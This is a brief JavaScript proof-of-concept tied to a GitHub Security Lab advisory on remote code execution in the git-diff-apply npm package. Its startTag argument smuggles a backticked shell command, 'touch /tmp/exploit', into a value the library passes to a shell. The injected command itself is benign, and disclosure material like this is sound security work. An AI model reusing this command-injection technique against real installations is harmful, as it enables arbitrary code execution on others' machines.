//https://securitylab.github.com/advisories/GHSL-2020-122-rce-git-diff-apply/
var diff = require("git-diff-apply");

diff({"remoteUrl": "https://github.com/kellyselden/git-diff-apply.git", "startTag": "none`touch /tmp/exploit`", "endTag": "bla", "cwd": "."})
